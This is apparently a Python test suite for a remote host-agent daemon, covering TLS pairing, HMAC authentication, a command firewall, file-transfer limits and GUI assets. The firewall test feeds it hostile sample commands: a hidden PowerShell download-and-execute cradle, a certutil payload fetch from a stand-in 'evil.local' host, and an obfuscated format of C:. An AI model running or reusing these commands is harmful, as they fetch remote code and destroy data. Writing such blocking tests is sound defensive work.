#!/usr/bin/env python3
"""
Focused Verification Suite for Security Hardening, Performance Optimizations,
Antivirus / Smart App Control Hygiene, and Cyber Glassmorphic Desktop UI Parity.
"""

import ast
import asyncio
import hashlib
import hmac
import importlib
import json
import os
import shutil
import socket
import ssl
import struct
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

import websockets

AGENT_DIR = Path(__file__).resolve().parents[1]
REPO_ROOT = AGENT_DIR.parent
if str(AGENT_DIR) not in sys.path:
    sys.path.insert(0, str(AGENT_DIR))

try:
    import agent as _maybe_agent  # noqa: E402
    agent_mod = _maybe_agent if hasattr(_maybe_agent, "AdaptiveScreenPipeline") else importlib.import_module("agent.agent")
except ImportError:
    agent_mod = importlib.import_module("agent.agent")
import agent_gui as gui_mod  # noqa: E402
import command_ast_firewall as ast_mod  # noqa: E402
import cyber_ui_theme as ui_mod  # noqa: E402
import daemon_config as cfg_mod  # noqa: E402
import host_file_writer as writer_mod  # noqa: E402
import tls_manager as tls_mod  # noqa: E402
import windows_integration as wi_mod  # noqa: E402


def _subprocess_call_literals(py_path: Path) -> list[str]:
    """Collects string literal arguments passed directly inside subprocess calls."""
    tree = ast.parse(py_path.read_text(encoding="utf-8"))
    out: list[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            fn = node.func
            fn_name = ""
            if isinstance(fn, ast.Attribute) and isinstance(fn.value, ast.Name) and fn.value.id == "subprocess":
                fn_name = fn.attr
            if fn_name in ("run", "Popen", "call", "check_call", "check_output"):
                for sub in ast.walk(node):
                    if isinstance(sub, ast.Constant) and isinstance(sub.value, str):
                        out.append(sub.value.lower())
    return out


class TestDaemonConfigHardening(unittest.TestCase):
    def test_revision_pin_ttl_and_safe_pairing_uri(self):
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"AI_CONFIG_DIR": tmp}, clear=False):
                rev0 = cfg_mod.get_config_revision()
                cfg = cfg_mod.load_config()
                cfg["port"] = 8777
                self.assertTrue(cfg_mod.save_config(cfg))
                self.assertGreater(cfg_mod.get_config_revision(), rev0)

                pin1, _, rotated1 = cfg_mod.ensure_fresh_pin(
                    {"pairing_pin": "654321", "pin_issued_at": int(time.time()), "pin_ttl_seconds": 600}
                )
                self.assertEqual(pin1, "654321")
                self.assertFalse(rotated1)

                pin2, _, rotated2 = cfg_mod.ensure_fresh_pin(
                    {"pairing_pin": "654321", "pin_issued_at": int(time.time()) - 900, "pin_ttl_seconds": 300}
                )
                self.assertTrue(rotated2)
                self.assertEqual(len(pin2), 6)
                self.assertTrue(pin2.isdigit())

                uri = cfg_mod.build_pairing_uri(
                    "192.168.1.44",
                    8777,
                    pin2,
                    tls=True,
                    tls_fingerprint="abcdef1234567890deadbeef",
                )
                self.assertTrue(uri.startswith("ainet://pair?proto=wss&host=192.168.1.44&port=8777"))
                self.assertIn(f"pin={pin2}", uri)
                self.assertIn("fp=abcdef1234567890", uri)
                self.assertNotIn("ainet_", uri)

    def test_strict_dpapi_fails_closed_when_cryptprotect_unavailable(self):
        if os.name != "nt":
            self.skipTest("DPAPI fail-closed assertion applies strictly on Windows.")
        with mock.patch.dict(os.environ, {"AI_STRICT_DPAPI": "1"}, clear=False):
            with mock.patch("ctypes.windll.crypt32.CryptProtectData", return_value=0):
                with self.assertRaises(RuntimeError):
                    cfg_mod._dpapi_protect("ainet_secret_should_not_downgrade")


class TestTLSManagerAndWSSLoopback(unittest.TestCase):
    def test_ecdsa_p256_cert_generation_and_wss_loopback_handshake(self):
        async def _run():
            with tempfile.TemporaryDirectory() as tmp:
                cert_path, key_path, fp = tls_mod.ensure_tls_certificate(
                    cert_dir=tmp, extra_ips=["127.0.0.1"]
                )
                self.assertTrue(os.path.isfile(cert_path))
                self.assertTrue(os.path.isfile(key_path))
                self.assertEqual(len(fp), 64)
                self.assertEqual(fp, tls_mod.compute_cert_fingerprint(cert_path))

                ssl_ctx, ctx_fp = tls_mod.build_server_ssl_context(cert_dir=tmp, extra_ips=["127.0.0.1"])
                self.assertEqual(ctx_fp, fp)
                self.assertGreaterEqual(ssl_ctx.minimum_version, ssl.TLSVersion.TLSv1_2)

                probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                probe.bind(("127.0.0.1", 0))
                port = probe.getsockname()[1]
                probe.close()

                with mock.patch.dict(
                    os.environ,
                    {"AI_CONFIG_DIR": tmp, "AI_TLS_CERT": cert_path, "AI_TLS_KEY": key_path},
                    clear=False,
                ):
                    daemon = agent_mod.HostAgentDaemon(host="127.0.0.1", port=port, enable_tray=False, enable_mdns=False)
                    daemon.require_tls = True
                    await daemon.start()
                    try:
                        client_ssl = ssl.create_default_context(cafile=cert_path)
                        async with websockets.connect(f"wss://127.0.0.1:{port}", ssl=client_ssl) as ws:
                            chal_raw = await asyncio.wait_for(ws.recv(), timeout=4.0)
                            _, op, _, _, _, chal_payload = agent_mod.unpack_packet(chal_raw)
                            self.assertEqual(op, agent_mod.OP_AUTH)
                            self.assertEqual(len(chal_payload), 16)
                            mac = hmac.new(daemon.pairing_token.encode("utf-8"), chal_payload, hashlib.sha256).hexdigest()
                            await ws.send(json.dumps({"action": "AUTHENTICATE", "hmac": mac}))
                            ack = json.loads(await asyncio.wait_for(ws.recv(), timeout=4.0))
                            self.assertEqual(ack.get("event"), "AUTHENTICATED")
                    finally:
                        await daemon.async_stop()

        asyncio.run(_run())


class TestASTFirewallAndFileWriterHardening(unittest.TestCase):
    def test_firewall_blocks_lolbins_cradles_delayed_expansion_and_has_no_taskkill(self):
        fw = ast_mod.CommandASTFirewall()
        cradle_ok, cradle_risk, _, _ = fw.inspect_and_sanitize(
            "powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://x/a')"
        )
        self.assertTrue((not cradle_ok) or cradle_risk in ("BLOCKED", "REQUIRES_BIOMETRIC", "CRITICAL"))

        lol_ok, lol_risk, _, _ = fw.inspect_and_sanitize(
            "certutil -urlcache -split -f http://evil.local/payload.exe p.exe"
        )
        self.assertTrue((not lol_ok) or lol_risk in ("BLOCKED", "REQUIRES_BIOMETRIC", "CRITICAL"))

        del_ok, del_risk, _, _ = fw.inspect_and_sanitize("cmd /v:on /c set a=f&&!a!ormat C:")
        self.assertTrue((not del_ok) or del_risk in ("BLOCKED", "REQUIRES_BIOMETRIC", "CRITICAL"))

        safe_ok, safe_risk, norm_cmd, _ = fw.inspect_and_sanitize("  ipconfig   /all  ")
        self.assertTrue(safe_ok)
        self.assertEqual(safe_risk, "SAFE")
        self.assertEqual(norm_cmd, "ipconfig /all")

        sp_lits = _subprocess_call_literals(AGENT_DIR / "command_ast_firewall.py")
        self.assertFalse(any("taskkill" in s for s in sp_lits))

    def test_file_writer_concurrency_disk_reserve_and_motw(self):
        with tempfile.TemporaryDirectory() as tmp:
            fw = writer_mod.HostFileWriter(download_dir=tmp)
            digest_hex = hashlib.sha256(b"hello").hexdigest().encode("ascii")

            for tid in range(1, writer_mod.MAX_CONCURRENT_TRANSFERS + 1):
                pkt = bytearray([writer_mod.CMD_INIT])
                pkt.extend(struct.pack("!IQ", tid, 5))
                pkt.extend(digest_hex)
                pkt.extend(f"f{tid}.txt".encode("utf-8"))
                ack = fw.handle_packet(bytes(pkt))
                _, status, _ = struct.unpack("!IBQ", ack[12:25])
                self.assertEqual(status, writer_mod.STATUS_OK)

            over_pkt = bytearray([writer_mod.CMD_INIT])
            over_pkt.extend(struct.pack("!IQ", 99, 5))
            over_pkt.extend(digest_hex)
            over_pkt.extend(b"over.txt")
            ack_over = fw.handle_packet(bytes(over_pkt))
            _, status_over, _ = struct.unpack("!IBQ", ack_over[12:25])
            self.assertEqual(status_over, writer_mod.STATUS_ERR_SIZE_LIMIT)

            fw.abort_all()

            fake_usage = shutil._ntuple_diskusage(1024 * 1024 * 1024, 1024 * 1024 * 1024 - 1024, 1024)
            with mock.patch("shutil.disk_usage", return_value=fake_usage):
                low_pkt = bytearray([writer_mod.CMD_INIT])
                low_pkt.extend(struct.pack("!IQ", 101, 4096))
                low_pkt.extend(digest_hex)
                low_pkt.extend(b"lowdisk.txt")
                ack_low = fw.handle_packet(bytes(low_pkt))
                _, status_low, _ = struct.unpack("!IBQ", ack_low[12:25])
                self.assertEqual(status_low, writer_mod.STATUS_ERR_SIZE_LIMIT)

            data = b"safe-payload"
            h_hex = hashlib.sha256(data).hexdigest().encode("ascii")
            init_ok = bytearray([writer_mod.CMD_INIT])
            init_ok.extend(struct.pack("!IQ", 200, len(data)))
            init_ok.extend(h_hex)
            init_ok.extend(b"safe.txt")
            fw.handle_packet(bytes(init_ok))
            chunk_pkt = bytearray([writer_mod.CMD_CHUNK]) + bytearray(struct.pack("!IQ", 200, 0)) + bytearray(data)
            fw.handle_packet(bytes(chunk_pkt))
            fin_pkt = bytearray([writer_mod.CMD_FINISH]) + bytearray(struct.pack("!I", 200))
            ack_fin = fw.handle_packet(bytes(fin_pkt))
            _, fin_st, _ = struct.unpack("!IBQ", ack_fin[12:25])
            self.assertEqual(fin_st, writer_mod.STATUS_COMPLETED)
            if os.name == "nt":
                ads_path = os.path.join(tmp, "safe.txt:Zone.Identifier")
                with open(ads_path, "r", encoding="utf-8") as af:
                    self.assertIn("ZoneId=3", af.read())


class TestAgentSecurityAndPipelinePerformance(unittest.TestCase):
    def test_origin_policy_and_strict_hmac_plus_aead_gate(self):
        self.assertTrue(agent_mod.HostAgentDaemon._is_origin_allowed(None))
        self.assertTrue(agent_mod.HostAgentDaemon._is_origin_allowed("capacitor://localhost"))
        self.assertTrue(agent_mod.HostAgentDaemon._is_origin_allowed("http://127.0.0.1:5173"))
        self.assertFalse(agent_mod.HostAgentDaemon._is_origin_allowed("https://evil.example.com"))
        self.assertFalse(agent_mod.HostAgentDaemon._is_origin_allowed("http://192.168.1.10:9999"))

        async def _run():
            with tempfile.TemporaryDirectory() as tmp:
                probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                probe.bind(("127.0.0.1", 0))
                port = probe.getsockname()[1]
                probe.close()

                with mock.patch.dict(os.environ, {"AI_CONFIG_DIR": tmp}, clear=False):
                    daemon = agent_mod.HostAgentDaemon(host="127.0.0.1", port=port, enable_tray=False, enable_mdns=False)
                    daemon.require_hmac_auth = True
                    daemon.require_aead = True
                    await daemon.start()
                    try:
                        url = f"ws://127.0.0.1:{port}"
                        async with websockets.connect(url) as ws1:
                            await asyncio.wait_for(ws1.recv(), timeout=3.0)
                            await ws1.send(json.dumps({"action": "AUTHENTICATE", "token": daemon.pairing_token}))
                            err = json.loads(await asyncio.wait_for(ws1.recv(), timeout=3.0))
                            self.assertEqual(err.get("event"), "ERROR")

                        async with websockets.connect(url) as ws2:
                            chal_raw = await asyncio.wait_for(ws2.recv(), timeout=3.0)
                            _, _, _, _, _, nonce = agent_mod.unpack_packet(chal_raw)
                            mac = hmac.new(daemon.pairing_token.encode("utf-8"), nonce, hashlib.sha256).hexdigest()
                            await ws2.send(json.dumps({"action": "AUTHENTICATE", "hmac": mac}))
                            ack = json.loads(await asyncio.wait_for(ws2.recv(), timeout=3.0))
                            self.assertEqual(ack.get("event"), "AUTHENTICATED")

                            await ws2.send(agent_mod.pack_packet(agent_mod.OP_SHELL, b'{"command":"echo hi"}', seq=1))
                            gate_raw = await asyncio.wait_for(ws2.recv(), timeout=3.0)
                            _, gate_op, _, _, _, gate_payload = agent_mod.unpack_packet(gate_raw)
                            self.assertEqual(gate_op, agent_mod.OP_ERR)
                            self.assertIn("ECDH", gate_payload.decode("utf-8", errors="replace").upper())
                    finally:
                        await daemon.async_stop()

        asyncio.run(_run())

    def test_turbojpeg_downscaled_fastpath_and_single_process_daemon(self):
        pipeline = agent_mod.AdaptiveScreenPipeline()
        pipeline.target_res = (320, 180)

        class _FakeGrab:
            width = 640
            height = 360
            size = (640, 360)
            raw = bytes([60, 120, 180, 255] * (640 * 360))
            bgra = raw

        class _FakeMSS:
            monitors = [{}, {"left": 0, "top": 0, "width": 640, "height": 360}]

            def grab(self, _mon):
                return _FakeGrab()

            def close(self):
                pass

        fake_turbo = mock.MagicMock()
        fake_turbo.encode.return_value = b"\xff\xd8\xff\xe0TURBO\xff\xd9"
        pipeline._local.sct = _FakeMSS()
        pipeline.turbo = fake_turbo

        jpg, dropped_static = pipeline._grab_and_compress()
        self.assertFalse(dropped_static)
        self.assertEqual(jpg, b"\xff\xd8\xff\xe0TURBO\xff\xd9")
        fake_turbo.encode.assert_called_once()
        args, kwargs = fake_turbo.encode.call_args
        self.assertEqual(args[0].shape[:2], (180, 320))
        self.assertEqual(kwargs.get("pixel_format"), 0)

        pipeline.turbo = None
        pipeline.last_frame_hash = None
        pipeline.force_keyframe = True
        jpg_pil, dropped_pil = pipeline._grab_and_compress()
        self.assertFalse(dropped_pil)
        self.assertIsNotNone(jpg_pil)
        self.assertTrue(jpg_pil.startswith(b"\xff\xd8\xff"))
        pipeline.close()

        daemon_src = (AGENT_DIR / "agent_daemon.py").read_text(encoding="utf-8")
        self.assertIn("--legacy-ipc", daemon_src)
        self.assertIn("AI_ENABLE_LEGACY_IPC", daemon_src)


class TestCyberGlassUIAndWindowsAVHygiene(unittest.TestCase):
    def test_cyber_colors_qr_and_compositor_assets(self):
        self.assertEqual(ui_mod.CyberColors.BACKGROUND, "#040812")
        self.assertEqual(ui_mod.CyberColors.SURFACE, "#0A1628")
        self.assertEqual(ui_mod.CyberColors.PRIMARY, "#00F0FF")
        self.assertEqual(ui_mod.CyberColors.SECONDARY, "#8A2BE2")
        self.assertEqual(ui_mod.CyberColors.ACCENT, "#FF0055")
        self.assertEqual(ui_mod.CyberColors.SUCCESS, "#00FF9D")

        mat = ui_mod.generate_qr_matrix("ainet://pair?proto=wss&host=192.168.1.5&port=8765&pin=123456")
        n = len(mat)
        self.assertGreaterEqual(n, 21)
        self.assertEqual(len(mat[0]), n)
        self.assertTrue(all(mat[0][c] for c in range(7)))
        self.assertTrue(all(mat[6][c] for c in range(7)))

        bg = ui_mod.render_ambient_backdrop(320, 240)
        orb = ui_mod.render_node_orb_image(48, pulse_phase=0.25, is_online=True)
        card = ui_mod.render_qr_card_image("ainet://pair?proto=ws&host=127.0.0.1&port=8765&pin=123456", pixel_size=160)
        self.assertIsNotNone(bg)
        self.assertEqual(bg.size, (320, 240))
        self.assertEqual(orb.size, (48, 48))
        self.assertEqual(card.size, (160, 160))

    def test_gui_state_hitl_queue_pairing_uri_and_blacklist_compat(self):
        state = gui_mod.HostDaemonState(host="127.0.0.1", port=8765)
        self.assertTrue(state.av_integrity.get("zero_vbs_dropper"))
        self.assertTrue(state.av_integrity.get("ntfs_dacl_hardened"))
        self.assertTrue(state.av_integrity.get("upx_disabled"))

        state.tls_enabled = True
        state.tls_fingerprint = "0123456789abcdef0123456789abcdef"
        uri = state.get_pairing_uri()
        self.assertIn("proto=wss", uri)
        self.assertNotIn(state.pairing_token, uri)

        state.blacklist_client(client_id_or_ip="198.51.100.10", device_name="Probe", reason="Test")
        self.assertTrue(state.is_ip_blacklisted("198.51.100.10"))
        state.unban_device("198.51.100.10")
        self.assertFalse(state.is_ip_blacklisted("198.51.100.10"))

        resolved = []
        state.request_local_hitl_approval("ap-1", "dir C:\\", "High risk test", lambda ok: resolved.append(ok))
        reqs = state.pop_pending_hitl_requests()
        self.assertEqual(len(reqs), 1)
        reqs[0]["resolve_cb"](True)
        self.assertEqual(resolved, [True])

    def test_windows_integration_zero_vbs_and_packaging_hygiene(self):
        self.assertIs(wi_mod.create_vbs_shortcut, wi_mod.create_native_shortcut)
        wi_sp = _subprocess_call_literals(AGENT_DIR / "windows_integration.py")
        self.assertFalse(any("cscript" in s or "wscript" in s or "taskkill" in s or ".vbs" in s for s in wi_sp))
        wi_src = (AGENT_DIR / "windows_integration.py").read_text(encoding="utf-8")
        self.assertNotIn("wscript.shell", wi_src.lower())

        req_txt = (AGENT_DIR / "requirements.txt").read_text(encoding="utf-8").lower()
        self.assertNotIn("aiohttp", req_txt)

        spec_txt = (AGENT_DIR / "build_agent.spec").read_text(encoding="utf-8")
        self.assertGreaterEqual(spec_txt.count("upx=False"), 2)
        self.assertIn("cyber_ui_theme.py", spec_txt)
        self.assertIn("tls_manager.py", spec_txt)
        self.assertIn("'aiohttp'", spec_txt)

        self.assertTrue((AGENT_DIR / "AppxManifest.xml").is_file())
        self.assertTrue((AGENT_DIR / "package_msix.ps1").is_file())

    def test_desktop_gui_builds_cyber_glass_views_and_cleans_up(self):
        if not gui_mod.HAS_TKINTER:
            self.skipTest("Tkinter unavailable")
        state = gui_mod.HostDaemonState(host="127.0.0.1", port=8765)
        state.setup_completed = True
        try:
            gui = gui_mod.HostDaemonDesktopGUI(state=state)
        except Exception as exc:
            self.skipTest(f"Tkinter display unavailable: {exc}")
        try:
            gui.root.withdraw()
            for tab in ("overview", "security", "console", "system"):
                gui._select_tab(tab)
                gui.root.update_idletasks()
            gui._select_tab("overview")
            gui._refresh_ui(force_telemetry=True)
            self.assertEqual(len(gui._views), 4)
            self.assertEqual(len(gui._orb_frames), 12)
            self.assertIsNotNone(gui._qr_photo)
        finally:
            try:
                gui.root.destroy()
            except Exception:
                pass


if __name__ == "__main__":
    unittest.main()
